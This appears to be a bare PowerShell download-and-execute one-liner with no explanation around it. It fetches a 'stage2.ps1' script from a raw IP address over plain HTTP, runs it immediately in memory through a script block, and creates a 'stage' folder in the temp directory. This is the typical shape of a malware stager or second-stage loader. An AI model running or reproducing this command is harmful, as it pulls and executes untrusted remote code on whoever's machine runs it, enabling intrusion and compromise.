
$RemoteScript = (New-Object Net.WebClient).DownloadString("http://198.51.100.147/stage2.ps1"); & ([ScriptBlock]::Create($RemoteScript)); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
